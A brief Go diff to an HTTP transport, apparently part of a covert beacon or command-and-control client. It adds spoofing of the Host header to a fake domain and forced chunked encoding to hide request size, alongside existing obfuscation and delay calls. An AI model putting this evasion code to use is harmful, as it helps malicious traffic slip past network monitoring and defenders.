@@ -39,9 +39,20 @@ func (hc *HTTPConn) RoundTrip(payload []byte) ([]byte, error) {
 	enc = ApplyObfuscation(enc, hc.Obfs)
 	ApplyDelay(hc.Obfs)
 
-	req, err := http.NewRequest("POST", hc.ServerURL, bytes.NewReader(enc))
+	body := bytes.NewReader(enc)
+	req, err := http.NewRequest("POST", hc.ServerURL, body)
 	if err != nil {
 		return nil, err
+	}
+	// Dagger-style Host spoofing (connect to real host, send fake Host header)
+	if hc.Mimic != nil {
+		if hc.Mimic.FakeDomain != "" {
+			req.Host = hc.Mimic.FakeDomain
+		}
+		// If Chunked is enabled, force chunked transfer encoding (hide body size)
+		if hc.Mimic.Chunked {
+			req.ContentLength = -1
+		}
 	}
 	ApplyMimicHeaders(req, hc.Mimic, hc.SessionID)
 
